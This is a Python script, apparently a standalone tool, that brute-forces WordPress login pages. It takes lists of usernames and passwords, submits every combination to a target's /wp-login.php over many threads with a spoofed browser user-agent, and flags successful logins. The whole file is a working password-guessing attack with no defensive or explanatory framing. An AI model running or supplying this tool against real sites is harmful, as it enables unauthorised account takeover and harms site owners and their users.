#!/usr/local/Cellar/python/2.7.12/Frameworks/Python.framework/Versions/2.7/bin/python2.7

import requests
import mmap
import argparse
import sys
import threading
from itertools import *
import urllib

######################
#
#       CONFIG
#
#######################


# Default log file name overridden with -l)
logFileName = "./log.txt"

# Default number of threads
defaultThreadLimit = 10


########################
#
#       FUNCTIONS
#
########################

def pprint(message):
    # Write it to file
    logFile.write(message + "\n")

    # Print it to screen
    print(message)

    # Flush stdout
    sys.stdout.flush()


def mapcount(filename):
    m = open(filename, "r+")

    buf = mmap.mmap(m.fileno(), 0)
    lines = 0
    readline = buf.readline
    while readline():
        lines += 1
    return lines


headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) '
                         'Chrome/58.0.3029.110 Safari/537.36',
           'Content-type': 'application/x-www-form-urlencoded',
           'Cookie': 'wordpress_test_cookie=WP+Cookie+check'}


def tryCombo(username, usernameNum, password, passwordNum):
    resultText = "Username [" + str(usernameNum) + "/" + str(totalEmails) + "] | Password [" + str(
        passwordNum) + "/" + str(totalPasswords) + "] :: " + username + " : " + password.rstrip()

    body = {'log': username,
            'pwd': password,
            'wp-submit': 'Login',
            'testcookie': '1'}

    try:
        r = requests.post(target, data=urllib.urlencode(body), headers=headers)

        if "wordpress_test_cookie" in r.headers["Set-Cookie"]:
            resultText += " - Bad login"
        else:
            resultText += " - GOOD LOGIN"

        print(resultText)
    except requests.exceptions.SSLError:
        print("Caught SSL error. Skipping...")
    except requests.exceptions.ConnectionError:
        print("Caught 'BadStatusLine' error. Skipping...")


exitFlag = 0


class bruteThread(threading.Thread):
    def __init__(self, email, emailNum, password, passwordNum):
        threading.Thread.__init__(self)
        self.email = email
        self.emailNum = emailNum
        self.password = password
        self.passwordNum = passwordNum

    def run(self):
        tryCombo(self.email, self.emailNum, self.password, self.passwordNum)


# Instantiate the parser
parser = argparse.ArgumentParser(description='')

# Declare arguments
parser.add_argument('-u', '--users', required=True, help='File with usernames to try')
parser.add_argument('-p', '--passwords', required=True, help='File of passwords to try')
parser.add_argument('-s', '--site', required=True, help='Site to target. Full path to /wp-login.php')
parser.add_argument('-l', '--logfile', required=False, help='Name of log file. Default: ' + str(logFileName))
parser.add_argument('-t', '--threads', type=int, required=False, help='Number of threads to use. Default: ' + str(defaultThreadLimit))

# Parse the args
args = parser.parse_args()

# Parse logfile arg
if args.logfile:
    logFileName = args.logfile

# Parse threads arg
threadLimit = defaultThreadLimit
if args.threads:
    threadLimit = args.threads

# Parse site arg
target = args.site

# Open log file for writing
logFile = open(logFileName, 'a+')

pprint("Using " + str(threadLimit) + " threads")

pprint("Counting total usernames...")
totalEmails = mapcount(args.users)

pprint("Counting total passwords...")
totalPasswords = mapcount(args.passwords)

if totalPasswords % threadLimit != 0:
    pprint("\nWarning : (Password count/threads) does not modulo 0. Change the thread count "
           "or passwords will be skipped. \n")

f = open(args.users, 'r')

e = 1  # Email address index
threads = []

groupIndex = 0
for user in f.readlines():

    user = user.rstrip()  # Strip /r/n

    p = 1  # Password index

    with open(args.passwords, 'r') as g:
        groupIndex = 0
        while groupIndex < totalPasswords / threadLimit:  # For every group of (threadLimit) ....
            for i in islice(g, threadLimit):  # For each password in the chunk ....
                thread1 = bruteThread(user, e, i, p)
                thread1.start()
                threads.append(thread1)
                p += 1

            # Wait for all threads to complete
            for t in threads:
                t.join()
            groupIndex += 1

    g.close()

    e += 1
